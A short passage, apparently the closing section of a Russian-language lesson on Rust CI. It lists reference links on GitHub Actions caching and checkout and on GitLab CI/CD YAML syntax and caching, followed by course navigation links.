- [Swatinem/rust-cache](https://github.com/Swatinem/rust-cache) — действие кэширования для Rust с объяснением ключа кэша.
- [actions/checkout](https://github.com/actions/checkout) — действие, скачивающее ваш репозиторий; на странице релизов видна текущая основная версия.
- [GitLab CI/CD YAML syntax reference](https://docs.gitlab.com/ci/yaml/) — каждое ключевое слово `.gitlab-ci.yml`.
- [Caching in GitLab CI/CD](https://docs.gitlab.com/ci/caching/) — ключи кэша, пути и разница между кэшем и артефактами.

---

[🏠 Начало](../START-HERE.md) · [← 09.11 Бенчмарки подробно](11-benchmarking-in-depth.md) · [📋 Этап 09](README.md) · [09.13 Проект: хорошо протестированная библиотека с CI →](13-project-tested-library-with-ci.md) · [📖 Глоссарий](../GLOSSARY.md) <!-- nav -->
<!-- nav:bottom -->
